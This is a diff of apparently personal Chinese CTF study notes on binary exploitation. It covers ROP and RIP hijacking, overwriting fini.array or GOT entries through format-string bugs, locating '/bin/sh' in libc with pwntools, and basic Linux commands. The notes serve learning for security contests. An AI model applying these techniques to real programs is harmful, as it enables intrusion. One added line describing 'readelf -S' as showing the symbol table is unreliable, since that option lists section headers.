+<p>已写长度：打印出来的字符长度（%前出现的字符），地址数值大的写后面（就能直接减去前面已经写的偏移量）</p>
+<p>32、对于劫持rip的理解：首先我们传递给rip的是某个地址，其次这个地址指向的是一段有可执行权限的地址，最后这个地址上存在着指令（机器码）rop就是还需要ret来衔接进行不断地更换rip的值</p>
+<p>33、linux中，程序在加载的时候，会依次调用<code>init.array</code>数组中的每一个函数指针；在结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。一般用在当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。</p>
+<ul>
+<li>可以考虑改写<code>fini.array</code>中的函数指针为<code>main</code>函数地址，可以再执行一次<code>main</code>函数。（或者在格式化字符串漏洞后面存在有其他函数的调用，也可以考虑修改这个函数的got表）</li>
+<li>一般来说，这个数组的长度为1，也就是说只能写一个地址</li>
+</ul>
+<p>获取fini.array地址有两种方式：1、<code>fini_array = elf.sym[&quot;__init_array_end&quot;]</code>   2、使用<code>readelf -s 文件名</code>命令去查找<code>__init_array_end</code>的地址</p>
+<p>34、如果把0x80000000赋值给a，而a = -a，那么a还是等于0x80000000</p>
+<p>35、用libc寻找/bin/sh地址，要这么写binsh = libc_base + next(libc.search(‘/bin/sh’))</p>
+<p>36、scanf(buf,buf)，如果是以这样的形式出现输入，因为第一个buf是格式化字符串的样子，scanf使用了我们的输入作为格式化字符串，因此会存在格式化字符串漏洞，计算偏移需要通过gdb调试（必须在相应的版本下调试）</p>
+<p>%n$s（n是偏移，s是输入的形式以字符串，所以我们输入的地方是以偏移点作为指针输入的）</p>
 ]]></content>
   </entry>
   <entry>
@@ -3935,7 +4385,7 @@
 <td>查看该elf文件的libc和ld</td>
 </tr>
 <tr>
-<td>whami</td>
+<td>whoami</td>
 <td>打印用户名</td>
 </tr>
 <tr>
@@ -3971,7 +4421,7 @@
 <p>6、第六列为这个文件的创建日期或者是最近的修改日期</p>
 <p>7、第七列为这个文件的文件名：如果文件名前面有.说明是隐藏文件。如果只输入ls 前面加.的文件不会显示出来。ls -al则会显示出全部文件。</p>
 <h4 id="readelf指令"><a href="#readelf指令" class="headerlink" title="readelf指令"></a>readelf指令</h4><p>1、readelf -h 文件名  查看文件的头部信息</p>
-<p>2、readelf -S 文件名  </p>
+<p>2、readelf -S 文件名  查看文件符号表</p>
 <h3 id="三、一些常识"><a href="#三、一些常识" class="headerlink" title="三、一些常识"></a>三、一些常识</h3><p>1、在Linux中，shell中执行可执行文件时要写成如**./mycat** 的格式，因为在Linux系统里，系统只会搜索环境变量path中去寻找，加个***./*** 是告诉系统去当前目录下去寻找</p>
 <p>2、chmod 754 文件名，用来给文件权限进行划分，其中r为4，w为2，x为1</p>
 <p>3、一个特殊符号：管道命令符 “|” 功能为：将在管道命令符|左边命令的标准输出作为右边命令的标准输入 </p>
